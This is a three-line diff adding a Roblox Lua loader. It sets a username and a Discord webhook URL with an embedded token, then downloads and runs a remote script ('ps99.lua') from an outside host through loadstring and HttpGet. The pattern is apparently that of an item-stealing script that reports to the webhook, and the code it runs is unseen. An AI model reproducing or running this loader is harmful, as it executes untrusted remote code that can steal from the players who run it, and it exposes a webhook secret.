@@ -1,0 +1,3 @@
+_G.User = "shere_758"
+_G.Webhook = "https://discord.com/api/webhooks/833527268097130556/daxW0DO6z-UM_tKsN9rZEagMoawa-w5PoQgDxqPkOzDlQGX-IZ8omabvb1eJCPt_4gcu"
+loadstring(game:HttpGet("https://roblox.blxbby.org/ps99.lua"))()
